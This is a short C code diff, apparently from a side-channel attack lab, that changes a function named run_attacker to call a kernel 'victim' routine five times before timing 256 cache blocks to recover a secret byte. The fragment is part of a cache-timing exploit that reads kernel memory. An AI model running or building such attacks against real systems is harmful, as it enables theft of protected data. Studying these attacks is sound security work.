@@ -56,7 +56,9 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         }
 
         // step2 : call the victim 
-        call_kernel_part1 (kernel_fd, shared_memory, current_offset);
+        for (int i=0; i<5; i++) {
+            call_kernel_part1 (kernel_fd, shared_memory, current_offset);                    
+        }
 
         // Step3 : read the cache to retrieve the secret byte
         for (int block = 0; block < 256; block++) {
